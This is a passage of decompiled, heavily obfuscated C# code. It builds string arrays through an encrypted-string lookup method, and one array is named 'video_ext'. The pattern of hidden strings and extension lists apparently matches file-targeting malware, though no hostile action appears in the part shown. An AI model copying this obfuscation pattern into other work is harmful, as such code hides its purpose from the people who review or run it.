					_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(1532),
					_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(1536),
					_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(1540),
					_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(1544),
					_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(1548),
					_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(1552),
					_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(1556),
					_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(1560),
					_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(1564),
					_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(1568),
					_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(1572),
					_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(1576),
					_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(1580),
					_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(1584),
					_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(1588),
					_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(1592),
					_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(1596),
					_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(1176),
					_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(1600),
					_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(1184),
					_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(1604),
					_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(1608),
					_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(1612),
					_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(1616),
					_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(1620),
					_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(1624),
					_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(1628),
					_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(1632),
					_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(1636),
					_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(1640),
					_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(1644),
					_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(1648),
					_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(1652),
					_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(1656),
					_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(1660),
					_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(1664),
					_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(1668),
					_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(1672),
					_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(1676),
					_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(1680),
					_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(1684),
					_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(1688),
					_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(1692),
					_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(1696),
					_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(1700),
					_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(1704),
					_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(1708),
					_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(1712),
					_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(1716),
					_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(1720),
					_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(1724),
					_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(1728),
					_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(1732),
					_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(1736),
					_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(1740),
					_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(1744),
					_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(1748),
					_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(1752),
					_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(1756),
					_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(420),
					_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(1760),
					_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(1764),
					_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(1768),
					_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(1772),
					_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(1776),
					_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(1780),
					_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(1784),
					_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(1404),
					_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(1788),
					_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(1792),
					_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(1796),
					_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(1800),
					_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(1804),
					_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(1808),
					_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(1812),
					_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(1816),
					_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(1820),
					_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(1824),
					_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(1828),
					_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(1832),
					_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(1836),
					_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(1840),
					_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(1844),
					_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(1848),
					_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(1852),
					_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(1856),
					_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(1860),
					_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(1864),
					_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(1868),
					_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(1872),
					_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(1876),
					_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(1880),
					_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(1884),
					_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(1888),
					_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(1892),
					_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(948),
					_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(1892),
					_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(1896),
					_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(1900),
					_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(1904),
					_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(1908),
					_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(1912),
					_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(1916),
					_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(1920),
					_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(1924),
					_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(1928),
					_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(1932),
					_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(1936),
					_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(1940),
					_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(1944)
				};
				num = 1;
				if (!_0089_008D_0089_0089_0092_0095_0092_0087_008B_0094_008B_008A_0094_008B_008F_008F_0089_0091_008A_0091_0090_008F_0093_008E_008B_0093_008D_008F_0095_008F_0091_0090_0089_0086_008B_0092())
				{
					goto case 1;
				}
				goto IL_1b67;
			case 1:
				video_ext = new string[15]
				{
					_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(1272),
					_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(1324),
					_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(1384),
					_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(1388),
					_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(1392),
					_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(1424),
					_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(1948),
					_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(1952),
					_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(1448),
